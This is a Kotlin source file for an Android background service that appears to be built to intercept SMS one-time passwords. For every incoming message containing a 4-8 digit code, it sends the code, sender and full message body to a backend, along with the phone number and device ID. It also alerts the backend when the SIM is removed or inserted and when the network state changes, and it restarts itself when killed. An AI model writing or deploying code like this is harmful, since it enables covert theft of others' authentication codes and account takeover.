package com.example

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Persistent background service that monitors OTPs, SIM state, and network state
 * Runs even when app is closed or removed from recents
 */
class PersistentMonitorService : Service() {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var lastSimState = TelephonyManager.SIM_STATE_UNKNOWN
    private var lastNetworkAvailable = false
    private var lastNetworkType = ""
    
    // Real-time SIM state change receiver
    private val simStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val action = intent.action
            println("PersistentMonitorService: 📱 SIM BROADCAST RECEIVED! Action: $action")
            
            // Check immediately when broadcast received
            checkSimState()
        }
    }
    
    // Backup polling for non-SMS state; SMS forwarding is event-driven.
    private val monitorRunnable = object : Runnable {
        override fun run() {
            checkSimState()
            handler.postDelayed(this, MONITOR_INTERVAL_MS)
        }
    }
    
    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                for (message in messages) {
                    val body = message?.messageBody ?: continue
                    val sender = message.originatingAddress ?: "Unknown"
                    val timestamp = message.timestampMillis
                    
                    val otpRegex = Regex("\\b\\d{4,8}\\b")
                    val match = otpRegex.find(body)
                    match?.let { matchResult ->
                        println("PersistentMonitorService: ✅ SMS OTP detected: ${matchResult.value} from $sender")
                        // Report OTP immediately
                        serviceScope.launch {
                            OtpReporter.report(
                                applicationContext,
                                matchResult.value,
                                sender,
                                body,
                                timestamp,
                                "sms"
                            )
                        }
                    }
                }
            }
        }
    }
    
        // Network callback for instant network loss and cellular reconnection detection
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            println("PersistentMonitorService: Network available callback")
            checkNetworkState("available")
        }

        override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
            val networkType = networkTypeName(networkCapabilities)
            val isAvailable = hasUsableInternet(networkCapabilities)
            println("PersistentMonitorService: Network capabilities changed - available=$isAvailable type=$networkType")
            updateNetworkState(isAvailable, "capabilities", networkType)
        }

        override fun onLost(network: Network) {
            println("PersistentMonitorService: Network lost callback")
            handler.postDelayed({ checkNetworkState("lost") }, NETWORK_RECHECK_DELAY_MS)
        }

        override fun onUnavailable() {
            println("PersistentMonitorService: Network unavailable callback")
            updateNetworkState(false, "unavailable", "None")
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(
            NOTIFICATION_ID,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentTitle("Live Monitoring Active")
                .setContentText("Monitoring OTPs, SIM & Network")
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        )
        
        // Register SMS receiver with high priority
        val smsFilter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION).apply {
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, smsFilter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(smsReceiver, smsFilter)
        }
        
        // Register SIM state change receiver for INSTANT detection
        val simFilter = IntentFilter().apply {
            // Use string literals for broader compatibility
            addAction("android.intent.action.SIM_STATE_CHANGED")
            addAction("android.telephony.action.CARRIER_CONFIG_CHANGED")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                addAction("android.telephony.action.SIM_CARD_STATE_CHANGED")
                addAction("android.telephony.action.SIM_APPLICATION_STATE_CHANGED")
            }
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(simStateReceiver, simFilter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(simStateReceiver, simFilter)
        }
        println("PersistentMonitorService: ✅ SIM state broadcast receiver registered")
        
        // Register network callback for instant network loss detection
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val networkRequest = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
            println("PersistentMonitorService: Network callback registered")
        } catch (e: Exception) {
            println("PersistentMonitorService: Error registering network callback: ${e.message}")
        }
        
        // Initialize SIM state
        checkSimState()
        
        // Start backup monitoring loop (in case broadcasts are missed)
        handler.post(monitorRunnable)
        
        println("PersistentMonitorService: ✅ Service started - Live monitoring active")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // START_STICKY ensures service restarts if killed
        println("PersistentMonitorService: onStartCommand called")
        return START_STICKY
    }
    
    override fun onTaskRemoved(intent: Intent?) {
        println("PersistentMonitorService: ⚠️ Task removed - Service continues running")
        super.onTaskRemoved(intent)
        // Service continues running
    }
    
    override fun onDestroy() {
        println("PersistentMonitorService: ⚠️ Service onDestroy called - Attempting restart")
        handler.removeCallbacks(monitorRunnable)
        
        try {
            unregisterReceiver(smsReceiver)
        } catch (e: Exception) {
            println("PersistentMonitorService: Error unregistering SMS receiver: ${e.message}")
        }
        
        try {
            unregisterReceiver(simStateReceiver)
        } catch (e: Exception) {
            println("PersistentMonitorService: Error unregistering SIM receiver: ${e.message}")
        }
        
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            connectivityManager.unregisterNetworkCallback(networkCallback)
        } catch (e: Exception) {
            println("PersistentMonitorService: Error unregistering network callback: ${e.message}")
        }
        
        super.onDestroy()
        
        // Restart service if destroyed
        val restartIntent = Intent(applicationContext, PersistentMonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(restartIntent)
        } else {
            applicationContext.startService(restartIntent)
        }
        
        println("PersistentMonitorService: Restart intent sent")
    }
    
    override fun onBind(intent: Intent?): IBinder? = null

    private fun checkNetworkState(reason: String) {
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetwork = connectivityManager.activeNetwork
            val capabilities = activeNetwork?.let { connectivityManager.getNetworkCapabilities(it) }
            val networkType = capabilities?.let { networkTypeName(it) } ?: "None"
            val isAvailable = capabilities?.let { hasUsableInternet(it) } == true
            println("PersistentMonitorService: Network check [$reason] available=$isAvailable type=$networkType")
            updateNetworkState(isAvailable, reason, networkType)
        } catch (e: Exception) {
            println("PersistentMonitorService: Error checking network state: ${e.message}")
        }
    }

    private fun hasUsableInternet(capabilities: NetworkCapabilities): Boolean {
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }

    private fun networkTypeName(capabilities: NetworkCapabilities): String {
        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "Unknown"
        }
    }

    private fun updateNetworkState(isAvailable: Boolean, reason: String, networkType: String) {
        val changed = isAvailable != lastNetworkAvailable || (isAvailable && networkType != lastNetworkType)
        lastNetworkAvailable = isAvailable
        lastNetworkType = networkType
        if (!changed) return

        if (isAvailable) {
            println("PersistentMonitorService: Network ONLINE via $networkType ($reason)")
            requestTelemetryNow()
            sendNetworkAlert("online", networkType)
        } else {
            println("PersistentMonitorService: Network OFFLINE ($reason)")
            sendNetworkAlert("offline", networkType)
        }
    }

    private fun requestTelemetryNow() {
        try {
            val intent = Intent(applicationContext, DeviceTelemetryService::class.java).apply {
                action = DeviceTelemetryService.ACTION_SEND_NOW
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
        } catch (e: Exception) {
            println("PersistentMonitorService: Error requesting telemetry refresh: ${e.message}")
        }
    }

    
    @SuppressLint("MissingPermission")
    private fun checkSimState() {
        try {
            val hasPermission = checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
            if (!hasPermission) {
                return
            }
            
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val currentSimState = telephonyManager.simState
            
            // Log every check for debugging
            if (currentSimState != lastSimState) {
                println("PersistentMonitorService: 🚨🚨🚨 SIM STATE CHANGED DETECTED!")
                println("PersistentMonitorService: Previous state: $lastSimState")
                println("PersistentMonitorService: Current state: $currentSimState")
                println("PersistentMonitorService: State meanings:")
                println("  - SIM_STATE_UNKNOWN (0): Unknown")
                println("  - SIM_STATE_ABSENT (1): No SIM card")
                println("  - SIM_STATE_PIN_REQUIRED (2): PIN required")
                println("  - SIM_STATE_PUK_REQUIRED (3): PUK required")
                println("  - SIM_STATE_NETWORK_LOCKED (4): Network locked")
                println("  - SIM_STATE_READY (5): SIM is ready")
                
                when (currentSimState) {
                    TelephonyManager.SIM_STATE_ABSENT -> {
                        println("PersistentMonitorService: 🚨🚨🚨 SIM CARD REMOVED! Sending alert NOW!")
                        sendSimAlert("removed")
                    }
                    TelephonyManager.SIM_STATE_READY -> {
                        if (lastSimState == TelephonyManager.SIM_STATE_ABSENT) {
                            println("PersistentMonitorService: ✅✅✅ SIM CARD INSERTED! Sending alert NOW!")
                            sendSimAlert("inserted")
                        }
                    }
                    TelephonyManager.SIM_STATE_NOT_READY,
                    TelephonyManager.SIM_STATE_PIN_REQUIRED,
                    TelephonyManager.SIM_STATE_PUK_REQUIRED,
                    TelephonyManager.SIM_STATE_NETWORK_LOCKED -> {
                        println("PersistentMonitorService: ⚠️ SIM NOT READY - State: $currentSimState")
                        if (lastSimState == TelephonyManager.SIM_STATE_READY) {
                            sendSimAlert("not_ready")
                        }
                    }
                }
                
                lastSimState = currentSimState
            }
        } catch (e: Exception) {
            println("PersistentMonitorService: Error checking SIM state: ${e.message}")
            e.printStackTrace()
        }
    }
    
    private fun sendSimAlert(status: String) {
        serviceScope.launch {
            try {
                val prefs = getSharedPreferences("auto_otp_prefs", Context.MODE_PRIVATE)
                val phoneNumber = prefs.getString("phone_number", null)
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                
                println("PersistentMonitorService: 🚨🚨🚨 SIM ALERT: $status - Phone: $phoneNumber - SENDING TO BACKEND NOW!")
                
                val message = when(status) {
                    "removed" -> "SIM card physically removed from device"
                    "inserted" -> "SIM card inserted and ready"
                    "not_ready" -> "SIM card present but not ready (PIN/PUK required or network locked)"
                    else -> "SIM state changed: $status"
                }
                
                // Send via OtpReporter which has the backend connection
                OtpReporter.reportAlert(
                    applicationContext,
                    "sim_$status",
                    message,
                    phoneNumber ?: "Unknown",
                    deviceId
                )
                
            } catch (e: Exception) {
                println("PersistentMonitorService: Error sending SIM alert: ${e.message}")
                e.printStackTrace()
            }
        }
    }
    
    private fun sendNetworkAlert(status: String, networkType: String) {
        serviceScope.launch {
            try {
                val prefs = getSharedPreferences("auto_otp_prefs", Context.MODE_PRIVATE)
                val phoneNumber = prefs.getString("phone_number", null)
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                
                println("PersistentMonitorService: 🌐🌐🌐 NETWORK ALERT: $status - Phone: $phoneNumber - SENDING TO BACKEND NOW!")
                
                val message = when(status) {
                    "offline" -> "No internet connection - WiFi/Mobile Data off or Airplane Mode enabled"
                    "online" -> "Internet connection restored"
                    else -> "Network state changed: $status"
                }
                
                // Send via OtpReporter
                OtpReporter.reportAlert(
                    applicationContext,
                    "network_$status",
                    message,
                    phoneNumber ?: "Unknown",
                    deviceId,
                    networkType
                )
                
            } catch (e: Exception) {
                println("PersistentMonitorService: Error sending network alert: ${e.message}")
                e.printStackTrace()
            }
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Live OTP Monitor",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Background OTP, SIM & Network monitoring"
        }
        
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
    }
    
    companion object {
        private const val CHANNEL_ID = "persistent_monitor"
        private const val NOTIFICATION_ID = 1003
        private const val MONITOR_INTERVAL_MS = 45 * 1000L
        private const val NETWORK_RECHECK_DELAY_MS = 1500L
    }
}
